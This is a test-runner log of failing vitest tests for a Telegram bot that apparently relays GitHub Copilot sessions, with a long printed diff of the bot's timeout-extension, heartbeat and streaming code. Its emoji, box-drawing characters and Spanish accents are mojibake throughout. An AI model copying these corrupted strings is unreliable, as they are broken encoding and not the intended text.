 Ã”Ã˜Â» tests/mcp-add-command-allowlist.test.ts:376:15
    374|       const handler = (bot as any).commandHandlers?.get('mcp');
    375|       if (!handler) {
    376|         throw new Error('mcp command handler not registered');
       |               ^
    377|       }
    378| 

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[76/182]Ã”Ã„Â»

 FAIL  tests/mcp-add-command-allowlist.test.ts > Task 1.2: /mcp add Command Allowlist Validation > Backward Compatibility > should maintain existing usage message format
Error: mcp command handler not registered
 Ã”Ã˜Â» tests/mcp-add-command-allowlist.test.ts:393:15
    391|       const handler = (bot as any).commandHandlers?.get('mcp');
    392|       if (!handler) {
    393|         throw new Error('mcp command handler not registered');
       |               ^
    394|       }
    395| 

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[77/182]Ã”Ã„Â»

 FAIL  tests/mcp-registry.test.ts > McpRegistry > loads servers from config file and toggles
AssertionError: expected +0 to be 1 // Object.is equality

- Expected
+ Received

- 1
+ 0

 Ã”Ã˜Â» tests/mcp-registry.test.ts:43:36
     41|     const registry = new McpRegistry(userState, user.id);
     42| 
     43|     expect(registry.list().length).toBe(1);
       |                                    ^
     44|     registry.disable('github');
     45|     expect(Object.keys(registry.getEnabled()).length).toBe(0);

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[78/182]Ã”Ã„Â»

 FAIL  tests/mcp-registry.test.ts > McpRegistry > public load() method reloads servers from database
AssertionError: expected +0 to be 1 // Object.is equality

- Expected
+ Received

- 1
+ 0

 Ã”Ã˜Â» tests/mcp-registry.test.ts:84:36
     82| 
     83|     // Initial state should have 1 server from constructor
     84|     expect(registry.list().length).toBe(1);
       |                                    ^
     85| 
     86|     // Add a new server directly to DB (simulating external modificatiÃ”Ã‡Âª

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[79/182]Ã”Ã„Â»

 FAIL  tests/message-handler.test.ts > Heartbeat functionality > should send heartbeat warning after HEARTBEAT_WARNING_INTERVAL without events
AssertionError: expected "spy" to be called with arguments: [ '456', 123, StringMatching{Ã”Ã‡Âª}, Ã”Ã‡Âª(1) ]

Received: 

  1st spy call:

  Array [
    "456",
    123,
-   StringMatching /Ã”Ã…â”‚ La tarea sigue en progreso \(\d+m \d+s\)\. Tiempo restante: \d+m\. \/stop para cancelar/,
+   "Ã”Ã…â”‚ La tarea sigue en progreso (10s). Tiempo restante: 9m. /stop para cancelar",
    Object {
      "parse_mode": "HTML",
    },
  ]


Number of calls: 1

 Ã”Ã˜Â» tests/message-handler.test.ts:135:33
    133|     
    134|     // Should have sent a heartbeat warning with enhanced format
    135|     expect(mockEditMessageText).toHaveBeenCalledWith(
       |                                 ^
    136|       '456',
    137|       123,

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[80/182]Ã”Ã„Â»

 FAIL  tests/race-condition-fix.test.ts > Race Condition Fix - Timeout Extension Mutex > Mutex Infrastructure > should have timeoutExtensionLocks Map declared
AssertionError: expected 'import { Bot, Context } from \'grammyÃ”Ã‡Âª' to contain 'timeoutExtensionLocks'

- Expected
+ Received

- timeoutExtensionLocks
+ import { Bot, Context } from 'grammy';

+ import { CopilotSession } from '@github/copilot-sdk';

+ import { config, isPathAllowed } from '../config';

+ import { splitMessage } from '../utils/message-splitter';

+ import { formatForTelegram } from '../utils/formatter';

+ import { SessionManager } from '../copilot/session-manager';

+ import { UserState } from '../state/user-state';

+ import { McpRegistry } from '../mcp/mcp-registry';

+ import { WizardManager } from './wizard-manager';

+ import { AllowlistSetupWizard } from './allowlist-setup';

+ import { ToolBundle } from '../types';

+ import { logger } from '../utils/logger';

+ import { sanitizeForLogging } from '../utils/sanitize';

+ import { sanitizeErrorForUser } from '../utils/error-sanitizer';

+ import { PLAN_MODE_SYSTEM_MESSAGE } from '../copilot/tools';

+ import { askTimeoutExtension } from './timeout-confirmation';

+ import { needsAllowlistSetup } from '../config';

+ import { formatElapsedTime } from '../utils/time';

+ import { AtomicLock } from '../utils/atomic-lock';

+ import {

+   ONE_SECOND_MS,

+   ONE_MINUTE_MS,

+   BYTES_PER_KB,

+   AUTO_EXTENSION_CHECK_INTERVAL_MS,

+   ACTIVITY_WINDOW_MS,

+   AUTO_EXTENSION_THRESHOLD,

+   TELEGRAM_MAX_MESSAGE_LENGTH,

+   MAX_EVENT_DATA_PREVIEW_LENGTH,

+ } from '../constants';

+ 

+ // ============================================================================

+ // TIMEOUT EXTENSION MUTEX

+ // 

+ // Prevents race conditions between auto-extension and manual extension using

+ // AtomicLock for truly atomic lock operations.

+ // 

+ // Invariants:

+ // 1. Only one extension operation can be in progress per user at a time

+ // 2. Lock is always released even if operation fails (finally block)

+ // 3. Concurrent extension attempts are rejected immediately (no queueing)

+ // 

+ // Issue #4 (Opus): Fixed race condition by using AtomicLock instead of

+ // separate check-and-set operations on Map.

+ // ============================================================================

+ 

+ /**

+  * Atomic lock instance for timeout extension operations.

+  * Prevents race conditions between auto-extend and manual confirmation.

+  * 

+  * Using AtomicLock ensures tryAcquire() is atomic - no race condition

+  * between checking if lock exists and setting it.

+  */

+ const timeoutExtensionLock = new AtomicLock();

+ 

+ /**

+  * Attempts to acquire a lock for timeout extension operation.

+  * Returns true if lock acquired, false if already locked.

+  * 

+  * INVARIANT: Each successful acquire MUST be paired with exactly one release()

+  * 

+  * @param userId - The user ID to lock

+  * @param operationType - 'auto' or 'manual' for logging purposes

+  * @returns true if lock was acquired, false if already locked

+  */

+ function acquireExtensionLock(userId: string, operationType: 'auto' | 'manual'): boolean {

+   const acquired = timeoutExtensionLock.tryAcquire(userId);

+   

+   if (!acquired) {

+     logger.debug('Extension lock already held, skipping operation', {

+       userId,

+       operationType,

+       lockStatus: 'already_locked',

+     });

+     return false;

+   }

+   

+   logger.debug('Extension lock acquired', {

+     userId,

+     operationType,

+     lockStatus: 'acquired',

+   });

+   return true;

+ }

+ 

+ /**

+  * Releases a lock for timeout extension operation.

+  * MUST be called in a finally block to ensure lock is always released.

+  * 

+  * @param userId - The user ID to unlock

+  * @param operationType - 'auto' or 'manual' for logging purposes

+  */

+ function releaseExtensionLock(userId: string, operationType: 'auto' | 'manual'): void {

+   timeoutExtensionLock.release(userId);

+   logger.debug('Extension lock released', {

+     userId,

+     operationType,

+     lockStatus: 'released',

+   });

+ }

+ 

+ // ============================================================================

+ // STREAMING HELPER FUNCTIONS

+ // 

+ // NOTE: These functions are designed to be extracted to src/bot/streaming/ 

+ // modules. Run `node create-streaming-dir.mjs` first, then these can be moved:

+ // - formatProgressMessage -> streaming/message-formatter.ts

+ // - HeartbeatContext, sendHeartbeatWarning -> streaming/heartbeat.ts

+ // - AutoExtensionContext, checkAutoExtension -> streaming/auto-extend.ts

+ // 

+ // Note: formatElapsedTime has been moved to src/utils/time.ts

+ // ============================================================================

+ 

+ /**

+  * Formats a progress message showing current status, buffer size, and elapsed time

+  * @param bufferSize - The current size of the buffer in characters

+  * @param elapsedMs - The elapsed time in milliseconds

+  * @param remainingMs - Optional remaining time in milliseconds

+  * @returns Formatted progress message: "Â­Æ’Ã¶Ã¤ Trabajando... (~X caracteres, Ys) | Zm restantes"

+  */

+ export function formatProgressMessage(bufferSize: number, elapsedMs: number, remainingMs?: number): string {

+   const seconds = Math.floor(elapsedMs / ONE_SECOND_MS);

+   let message = `Â­Æ’Ã¶Ã¤ Trabajando... (~${bufferSize} caracteres, ${seconds}s)`;

+   

+   if (remainingMs !== undefined && remainingMs > 0) {

+     const remainingMin = Math.floor(remainingMs / ONE_MINUTE_MS);

+     message += ` | ${remainingMin}m restantes`;

+   }

+   

+   return message;

+ }

+ 

+ 

+ 

+ // ============================================================================

+ // HEARTBEAT FUNCTIONS

+ // ============================================================================

+ 

+ /** Context for heartbeat operations */

+ interface HeartbeatContext {

+   chatId: string;

+   msgId: number;

+   startTime: number;

+   timeoutMs: number;

+   autoExtensionCount: number;

+   manualExtensionCount: number;

+   totalManualExtensionMs: number;

+ }

+ 

+ /**

+  * Sends a heartbeat warning to the user

+  */

+ function sendHeartbeatWarning(

+   bot: Bot,

+   ctx: HeartbeatContext

+ ): void {

+   const elapsed = Date.now() - ctx.startTime;

+   const formattedTime = formatElapsedTime(elapsed);

+   

+   // Calculate remaining time from ACTUAL timeout schedule

+   const baseTimeout = ctx.timeoutMs;

+   const totalExtensionMs = (ctx.autoExtensionCount * config.TIMEOUT_EXTENSION_MS) + ctx.totalManualExtensionMs;

+   const effectiveTimeout = baseTimeout + totalExtensionMs;

+   const remaining = effectiveTimeout - elapsed;

+   const remainingMinutes = Math.max(0, Math.floor(remaining / ONE_MINUTE_MS));

+   

+   // Count total extensions

+   const totalExtensions = ctx.autoExtensionCount + ctx.manualExtensionCount;

+   

+   // Build base message

+   let heartbeatMessage = `Ã”Ã…â”‚ La tarea sigue en progreso (${formattedTime}).`;

+   

+   // Add remaining time

+   heartbeatMessage += ` Tiempo restante: ${remainingMinutes}m.`;

+   

+   // Add extension info if applicable

+   if (totalExtensions > 0) {

+     heartbeatMessage += ` Ã”Ã…â–’Â´Â©Ã… Extendido ${totalExtensions}x.`;

+   }

+   

+   // Add cancellation option

+   heartbeatMessage += ` /stop para cancelar`;

+   

+   logger.debug('Sending enhanced heartbeat warning', {

+     chatId: ctx.chatId,

+     msgId: ctx.msgId,

+     elapsedMs: elapsed,

+     remainingMs: remaining,

+     autoExtensionCount: ctx.autoExtensionCount,

+     manualExtensionCount: ctx.manualExtensionCount,

+     totalExtensions,

+   });

+   

+   bot.api

+     .editMessageText(ctx.chatId, ctx.msgId, heartbeatMessage, { parse_mode: 'HTML' })

+     .catch((error) => {

+       logger.warn('Failed to send enhanced heartbeat warning', {

+         chatId: ctx.chatId,

+         msgId: ctx.msgId,

+         error: error.message,

+       });

+     });

+ }

+ 

+ // ============================================================================

+ // AUTO-EXTENSION FUNCTIONS

+ // ============================================================================

+ 

+ // AUTO_EXTENSION_THRESHOLD is imported from constants

+ // ACTIVITY_WINDOW_MS is imported from constants

+ 

+ /** Context for auto-extension operations */

+ interface AutoExtensionContext {

+   userId: string;

+   chatId: string;

+   startTime: number;

+   timeoutMs: number;

+   lastEventTime: number;

+ }

+ 

+ /**

+  * Checks if auto-extension should be triggered and performs the extension

+  * 

+  * RACE CONDITION PROTECTION:

+  * Uses acquireExtensionLock() to prevent concurrent extensions with manual confirmation.

+  * If lock cannot be acquired (manual extension in progress), operation is skipped.

+  * 

+  * @returns true if extension was performed, false otherwise

+  */

+ function checkAutoExtension(

+   bot: Bot,

+   sessionManager: SessionManager,

+   ctx: AutoExtensionContext,

+   autoExtensionCount: { value: number }

+ ): boolean {

+   const now = Date.now();

+   const elapsed = now - ctx.startTime;

+   

+   // Get current timeout (may have been extended)

+   const currentTimeout = sessionManager.getOriginalTimeout(ctx.userId) || ctx.timeoutMs;

+   const totalExtension = sessionManager.getTimeoutExtension(ctx.userId);

+   const effectiveTimeout = currentTimeout + totalExtension;

+   

+   // Check if we're at 70% of the effective timeout

+   const thresholdTime = effectiveTimeout * AUTO_EXTENSION_THRESHOLD;

+   

+   if (elapsed >= thresholdTime) {

+     // Check recent activity

+     const timeSinceLastEvent = now - ctx.lastEventTime;

+     

+     if (timeSinceLastEvent < ACTIVITY_WINDOW_MS) {

+       // Verify we don't exceed MAX_TIMEOUT_DURATION

+       const projectedTotal = elapsed + config.TIMEOUT_EXTENSION_MS;

+       

+       if (projectedTotal <= config.MAX_TIMEOUT_DURATION) {

+         // CRITICAL SECTION: Acquire lock before extending timeout

+         if (!acquireExtensionLock(ctx.userId, 'auto')) {

+           // Lock held by manual extension - skip to avoid race condition

+           logger.debug('Auto-extension skipped: lock held by manual operation', {

+             userId: ctx.userId,

+             chatId: ctx.chatId,

+           });

+           return false;

+         }

+         

+         try {

+           // Perform auto-extension (atomic operation inside lock)

+           const extended = sessionManager.extendTimeout(ctx.userId, config.TIMEOUT_EXTENSION_MS);

+           

+           if (extended) {

+             autoExtensionCount.value++;

+             

+             logger.info('Auto-extension triggered', {

+               userId: ctx.userId,

+               chatId: ctx.chatId,

+               autoExtensionCount: autoExtensionCount.value,

+               elapsedMs: elapsed,

+               extensionMs: config.TIMEOUT_EXTENSION_MS,

+               newTotalMs: elapsed + config.TIMEOUT_EXTENSION_MS,

+             });

+             

+             // Notify user

+             const minutes = Math.floor(config.TIMEOUT_EXTENSION_MS / ONE_MINUTE_MS);

+             const notificationMsg = `Ã”Ã…â–’Â´Â©Ã… Tarea compleja detectada, tiempo extendido +${minutes}min`;

+             

+             bot.api

+               .sendMessage(ctx.chatId, notificationMsg)

+               .catch((error) => {

+                 logger.warn('Failed to send auto-extension notification', {

+                   chatId: ctx.chatId,

+                   error: error.message,

+                 });

+               });

+             

+             return true;

+           }

+         } finally {

+           // INVARIANT: Always release lock, even if extension fails

+           releaseExtensionLock(ctx.userId, 'auto');

+         }

+       } else {

+         logger.warn('Auto-extension skipped: would exceed MAX_TIMEOUT_DURATION', {

+           userId: ctx.userId,

+           chatId: ctx.chatId,

+           projectedTotal,

+           maxTimeout: config.MAX_TIMEOUT_DURATION,

+         });

+       }

+     }

+   }

+   

+   return false;

+ }

+ 

+ // ============================================================================

+ // INPUT SIZE VALIDATION

+ // ============================================================================

+ 

+ /**

+  * Result of message size validation

+  */

+ export interface ValidationResult {

+   text: string;

+   truncated: boolean;

+   warning?: string;

+ }

+ 

+ /**

+  * Validates and truncates message if it exceeds MAX_INPUT_SIZE_BYTES

+  * @param text - The message text to validate

+  * @param ctx - The Telegram context to send warnings

+  * @returns Validation result with potentially truncated text

+  */

+ export async function validateMessageSize(text: string, ctx: Context): Promise<ValidationResult> {

+   const sizeBytes = Buffer.byteLength(text, 'utf-8');

+   

+   if (sizeBytes > config.MAX_INPUT_SIZE_BYTES) {

+     const sizeMB = (sizeBytes / BYTES_PER_KB).toFixed(2);

+     const maxMB = (config.MAX_INPUT_SIZE_BYTES / BYTES_PER_KB).toFixed(2);

+     

+     logger.warn('Input message too large, truncating', {

+       sizeBytes,

+       maxBytes: config.MAX_INPUT_SIZE_BYTES,

+     });

+     

+     // Truncate to limit - ensure we don't cut in the middle of a multi-byte character

+     let truncated = text;

+     let currentBytes = sizeBytes;

+     

+     while (currentBytes > config.MAX_INPUT_SIZE_BYTES) {

+       // Reduce by 10% to ensure we're under the limit

+       const targetLength = Math.floor(truncated.length * 0.9);

+       truncated = truncated.substring(0, targetLength);

+       currentBytes = Buffer.byteLength(truncated, 'utf-8');

+     }

+     

+     // Notify user

+     const warningMsg = `Ã”ÃœÃ¡Â´Â©Ã… Mensaje demasiado grande (${sizeMB}KB). Truncado a ${maxMB}KB.`;

+     await ctx.reply(warningMsg);

+     

+     return {

+       text: truncated,

+       truncated: true,

+       warning: warningMsg,

+     };

+   }

+   

+   return {

+     text,

+     truncated: false,

+   };

+ }

+ 

+ function trimBufferToMaxBytes(value: string, maxBytes: number): string {

+   const currentSize = Buffer.byteLength(value, 'utf-8');

+   if (currentSize <= maxBytes) {

+     return value;

+   }

+ 

+   const bytes = Buffer.from(value, 'utf-8');

+   return bytes.subarray(bytes.length - maxBytes).toString('utf-8');

+ }

+ 

+ // ============================================================================

+ // STREAMING PROMPT HANDLER

+ // ============================================================================

+ 

+ async function sendPromptWithStreaming(

+   ctx: Context,

+   session: CopilotSession,

+   prompt: string,

+   bot: Bot,

+   sessionManager: SessionManager,

+   userId: string,

+   abortSignal?: AbortSignal

+ ): Promise<void> {

+   const chatId = String(ctx.chat?.id ?? '');

+   let buffer = '';

+   let msgId: number | null = null;

+   let lastUpdate = 0;

+   const timeoutMs = config.COPILOT_OPERATION_TIMEOUT;

+   const startTime = Date.now();

+ 

+   logger.info('Starting Copilot API call', sanitizeForLogging({

+     chatId,

+     userId,

+     promptLength: prompt.length,

+     prompt,

+     hasAbortSignal: !!abortSignal,

+   }));

+ 

+   logger.debug('Starting streaming prompt', {

+     chatId,

+     promptLength: prompt.length,

+     hasAbortSignal: !!abortSignal,

+   });

+ 

+   const statusMsg = await ctx.reply('Â­Æ’Ã¶Ã¤ Trabajando...');

+   msgId = statusMsg.message_id;

+   lastUpdate = Date.now();

+ 

+   logger.debug('Initial status message sent', {

+     chatId,

+     msgId,

+     timestamp: Date.now(),

+   });

+ 

+   await new Promise<void>((resolve, reject) => {

+     let unsubscribe = () => {};

+     let isFinished = false;

+     let isCancelled = false;

+     let lastProgressUpdate: Promise<any> | null = null;

+     let lastEventTime = Date.now();

+     let heartbeatTimer: NodeJS.Timeout | null = null;

+     let isAwaitingConfirmation = false;

+     

+     // Auto-extension tracking

+     let autoExtensionCount = 0;

+     let autoExtensionTimer: NodeJS.Timeout | null = null;

+     

+     // Manual extension tracking (Issue #3)

+     let manualExtensionCount = 0;

+     let totalManualExtensionMs = 0;

+     

+     // Buffer size tracking

+     let hasBufferWarningBeenSent = false;

+     

+     /**

+      * Timeout callback - asks user for confirmation before aborting

+      * 

+      * RACE CONDITION PROTECTION:

+      * Uses acquireExtensionLock() to prevent concurrent extensions with auto-extension.

+      * The lock is held during the entire confirmation and extension process.

+      */

+     const handleTimeout = async (): Promise<void> => {

+       // Check if already finished, cancelled, or awaiting confirmation to avoid race condition (Issue #2)

+       if (isFinished || isCancelled || isAwaitingConfirmation) return;

+ 

+       isAwaitingConfirmation = true;

+       

+       // CRITICAL SECTION: Acquire lock before asking for manual confirmation

+       // This prevents auto-extension from running while user is deciding

+       if (!acquireExtensionLock(userId, 'manual')) {

+         logger.warn('Manual extension confirmation skipped: lock held by auto-extension', {

+           userId,

+           chatId,

+         });

+         isAwaitingConfirmation = false;

+         return;

+       }

+       

+       try {

+         // Ask user if they want to extend

+         const shouldExtend = await askTimeoutExtension(userId, chatId, startTime, bot);

+ 

+         if (shouldExtend) {

+           // User wants to extend - verify we don't exceed MAX_TIMEOUT_DURATION

+           const elapsed = Date.now() - startTime;

+           const projectedTotal = elapsed + config.TIMEOUT_EXTENSION_MS;

+ 

+           if (projectedTotal <= config.MAX_TIMEOUT_DURATION) {

+             // Track manual extension (Issue #3)

+             manualExtensionCount++;

+             totalManualExtensionMs += config.TIMEOUT_EXTENSION_MS;

+ 

+             logger.info('Manual extension via confirmation', {

+               userId,

+               chatId,

+               manualExtensionCount,

+               totalManualExtensionMs,

+               elapsedMs: elapsed,

+             });

+ 

+             const minutes = Math.floor(config.TIMEOUT_EXTENSION_MS / 60000);

+             await bot.api.sendMessage(chatId, `Ã”Â£Ã  Tiempo extendido +${minutes}min`);

+ 

+             // Use extendTimeout to avoid resetting originalTimeout (critical fix)

+             const extended = sessionManager.extendTimeout(userId, config.TIMEOUT_EXTENSION_MS);

+             

+             if (!extended) {

+               logger.error('Failed to extend timeout for manual extension', { userId });

+               await bot.api.sendMessage(chatId, 'Ã”ÃœÃ¡Â´Â©Ã… Error al extender tiempo. La operaciâ”œâ”‚n serâ”œÃ­ cancelada.');

+               // Fall through to abort

+             } else {

+               return; // Don't abort - extension successful

+             }

+           } else {

+             // Exceeded maximum duration

+             await bot.api.sendMessage(

+               chatId,

+               `Ã”ÃœÃ¡Â´Â©Ã… Lâ”œÂ¡mite mâ”œÃ­ximo de 2 horas alcanzado. La operaciâ”œâ”‚n serâ”œÃ­ cancelada.`

+             );

+           }

+         }

+ 

+         // User declined or we hit limits - abort session

+         if (heartbeatTimer) clearTimeout(heartbeatTimer);

+         if (autoExtensionTimer) clearInterval(autoExtensionTimer);

+         abortSignal?.removeEventListener('abort', onAbort);

+         unsubscribe();

+ 

+         try {

+           await sessionManager.cancelActiveSession(userId);

+           logger.info('Session aborted after user declined extension or timeout limit reached', {

+             userId,

+             chatId,

+             shouldExtend,

+           });

+         } catch (error: any) {

+           logger.warn('Failed to abort session', {

+             userId,

+             error: error.message,

+           });

+         }

+ 

+         reject(new Error('Tiempo de espera agotado para la respuesta.'));

+       } finally {

+         // INVARIANT: Always release lock and clear confirmation flag

+         releaseExtensionLock(userId, 'manual');

+         isAwaitingConfirmation = false;

+       }

+     };

+ 

+     // Use SessionManager to manage timeout

+     sessionManager.startTimeout(userId, timeoutMs, handleTimeout);

+ 

+     /**

+      * Sends a heartbeat warning to the user using the extracted helper

+      */

+     const sendHeartbeatWarningLocal = () => {

+       if (isFinished || isCancelled || !msgId) return;

+       

+       sendHeartbeatWarning(bot, {

+         chatId,

+         msgId,

+         startTime,

+         timeoutMs,

+         autoExtensionCount,

+         manualExtensionCount,

+         totalManualExtensionMs,

+       });

+     };

+ 

+     /**

+      * Schedules the next heartbeat check

+      */

+     const scheduleHeartbeat = (isFirstWarning: boolean = false) => {

+       if (heartbeatTimer) clearTimeout(heartbeatTimer);

+       if (isFinished || isCancelled) return;

+       

+       const interval = isFirstWarning 

+         ? config.HEARTBEAT_WARNING_INTERVAL 

+         : config.HEARTBEAT_UPDATE_INTERVAL;

+       

+       heartbeatTimer = setTimeout(() => {

+         const timeSinceLastEvent = Date.now() - lastEventTime;

+         

+         // Only send warning if we haven't received events in the expected interval

+         if (timeSinceLastEvent >= interval) {

+           try {

+             sendHeartbeatWarningLocal();

+           } finally {

+             // Always schedule next heartbeat even if warning fails

+             scheduleHeartbeat(false);

+           }

+         } else {

+           // Reschedule for the remaining time

+           const remainingTime = interval - timeSinceLastEvent;

+           heartbeatTimer = setTimeout(() => {

+             try {

+               sendHeartbeatWarningLocal();

+             } finally {

+               // Always schedule next heartbeat even if warning fails

+               scheduleHeartbeat(false);

+             }

+           }, remainingTime);

+         }

+       }, interval);

+     };

+     

+     // Start the initial heartbeat timer

+     scheduleHeartbeat(true);

+ 

+     /**

+      * Checks if auto-extension should be triggered - uses extracted helper

+      */

+     const checkAutoExtensionLocal = () => {

+       // Issue #2: Check isAwaitingConfirmation to prevent race conditions

+       if (isFinished || isCancelled || isAwaitingConfirmation) return;

+       

+       const autoExtCounter = { value: autoExtensionCount };

+       const didExtend = checkAutoExtension(bot, sessionManager, {

+         userId,

+         chatId,

+         startTime,

+         timeoutMs,

+         lastEventTime,

+       }, autoExtCounter);

+       

+       if (didExtend) {

+         autoExtensionCount = autoExtCounter.value;

+       }

+     };

+ 

+     // Schedule auto-extension checks every 30 seconds

+     autoExtensionTimer = setInterval(checkAutoExtensionLocal, AUTO_EXTENSION_CHECK_INTERVAL_MS);

+ 

+ 

+     const onAbort = () => {

+       isCancelled = true;

+       if (heartbeatTimer) clearTimeout(heartbeatTimer);

+       if (autoExtensionTimer) clearInterval(autoExtensionTimer);

+       sessionManager.clearTimeout(userId);

+       unsubscribe();

+       reject(new Error('Operaciâ”œâ”‚n cancelada.'));

+     };

+     if (abortSignal) {

+       if (abortSignal.aborted) {

+         onAbort();

+         return;

+       }

+       abortSignal.addEventListener('abort', onAbort, { once: true });

+     }

+ 

+     unsubscribe = session.on((event) => {

+       // Skip processing if operation was cancelled

+       if (isCancelled) return;

+ 

+       const now = Date.now();

+       const elapsedMs = now - startTime;

+       const timeSinceLastEvent = now - lastEventTime;

+ 

+       // Log stale detection warning if no events for configured threshold

+       if (timeSinceLastEvent > config.STALE_PERIOD_THRESHOLD_MS) {

+         logger.warn('Stale period detected - no events received', {

+           event: event.type,

+           chatId,

+           stalePeriodMs: timeSinceLastEvent,

+           thresholdMs: config.STALE_PERIOD_THRESHOLD_MS,

+           elapsedMs,

+         });

+       }

+ 

+       switch (event.type) {

+         case 'assistant.message_delta': {

+           const deltaSize = event.data.deltaContent.length;

+           buffer += event.data.deltaContent;

+           

+           // Log message_delta event

+           logger.debug('SDK event: assistant.message_delta', {

+             event: 'assistant.message_delta',

+             chatId,

+             deltaSize,

+             bufferSize: buffer.length,

+             elapsedMs,

+             timeSinceLastEventMs: timeSinceLastEvent,

+           });

+           

+           // Check buffer size limit

+           const bufferSizeBytes = Buffer.byteLength(buffer, 'utf-8');

+           if (bufferSizeBytes > config.MAX_BUFFER_SIZE_BYTES) {

+             if (!hasBufferWarningBeenSent) {

+               hasBufferWarningBeenSent = true;

+               const bufferSizeKB = (bufferSizeBytes / BYTES_PER_KB).toFixed(2);

+               const maxBufferSizeKB = (config.MAX_BUFFER_SIZE_BYTES / BYTES_PER_KB).toFixed(2);

+               

+               logger.warn('Streaming buffer size exceeded limit', {

+                 bufferSize: bufferSizeBytes,

+                 maxBufferSize: config.MAX_BUFFER_SIZE_BYTES,

+                 chatId,

+               });

+               

+               const bufferWarningMsg = `Ã”ÃœÃ¡Â´Â©Ã… Buffer de streaming muy grande (${bufferSizeKB}KB). Se conservarâ”œÃ­ solo la parte mâ”œÃ­s reciente. Lâ”œÂ¡mite: ${maxBufferSizeKB}KB.`;

+               

+               bot.api

+                 .sendMessage(chatId, bufferWarningMsg)

+                 .catch((error) => {

+                   logger.warn('Failed to send buffer size warning', {

+                     chatId,

+                     error: error.message,

+                   });

+                 });

+             }

+ 

+             buffer = trimBufferToMaxBytes(buffer, config.MAX_BUFFER_SIZE_BYTES);

+           }

+           

+           // Reset heartbeat timer when we receive events

+           lastEventTime = now;

+           scheduleHeartbeat(true);

+ 

+           // Skip updates if cancelled

+           if (!isFinished && !isCancelled && msgId && now - lastUpdate > config.TELEGRAM_UPDATE_INTERVAL) {

+             lastUpdate = now;

+             const progressMessage = formatProgressMessage(buffer.length, elapsedMs);

+ 

+             logger.debug('Updating Telegram message', {

+               chatId,

+               msgId,

+               bufferSize: buffer.length,

+               elapsedMs: now - startTime,

+             });

+ 

+             const currentUpdate = bot.api

+               .editMessageText(chatId, msgId, progressMessage, { parse_mode: 'HTML' })

+               .then(() => {

+                 logger.debug('Telegram message updated successfully', {

+                   chatId,

+                   msgId,

+                 });

+               })

+               .catch((error) => {

+                 logger.warn('Failed to update Telegram message', {

+                   chatId,

+                   msgId,

+                   error: error.message,

+                 });

+               });

+             

+             lastProgressUpdate = lastProgressUpdate

+               ? lastProgressUpdate.then(() => currentUpdate).catch(() => currentUpdate)

+               : currentUpdate;

+           }

+           break;

+         }

+         case 'session.idle': {

+           isFinished = true;

+           if (heartbeatTimer) clearTimeout(heartbeatTimer);

+           if (autoExtensionTimer) clearInterval(autoExtensionTimer);

+           

+           const totalElapsedMs = Date.now() - startTime;

+           

+           // Log session.idle event with final buffer size and total elapsed time

+           logger.debug('SDK event: session.idle', {

+             event: 'session.idle',

+             chatId,

+             bufferSize: buffer.length,

+             elapsedMs,

+             elapsedSeconds: Math.floor(elapsedMs / 1000),

+           });

+           

+           // Log API call completion with performance metrics

+           const totalExtension = sessionManager.getTimeoutExtension(userId);

+           const manualExtensions = Math.floor(totalExtension / config.TIMEOUT_EXTENSION_MS);

+           

+           logger.info('Operation completed with enhanced stats', {

+             chatId,

+             userId,

+             elapsedMs: totalElapsedMs,

+             autoExtensionCount,

+             manualExtensions,

+             totalExtensions: autoExtensionCount + manualExtensions,

+             totalExtensionMs: totalExtension,

+           });

+           

+           const parts = splitMessage(buffer, TELEGRAM_MAX_MESSAGE_LENGTH);

+           const safeParts =

+             parts.length === 0

+               ? ['Ã”Â£Ã  Listo.']

+               : parts.map((part) => formatForTelegram(part));

+           

+           // Add enhanced completion message footer

+           const elapsedSeconds = Math.floor(elapsedMs / ONE_SECOND_MS);

+           if (safeParts.length > 0 && safeParts[0] !== 'Ã”Â£Ã  Listo.') {

+             const lastIndex = safeParts.length - 1;

+             

+             // Build completion footer with statistics

+             let completionFooter = '\n\nÃ”Ã…â–’Â´Â©Ã… <i>Completado en ';

+             

+             // Show time if > 60 seconds

+             if (totalElapsedMs > ONE_MINUTE_MS) {

+               const minutes = Math.floor(totalElapsedMs / ONE_MINUTE_MS);

+               const seconds = Math.floor((totalElapsedMs % ONE_MINUTE_MS) / ONE_SECOND_MS);

+               completionFooter += `${minutes}m ${seconds}s`;

+             } else {

+               completionFooter += `${elapsedSeconds}s`;

+             }

+             

+             // Add extension info if any

+             if (autoExtensionCount > 0 || manualExtensions > 0) {

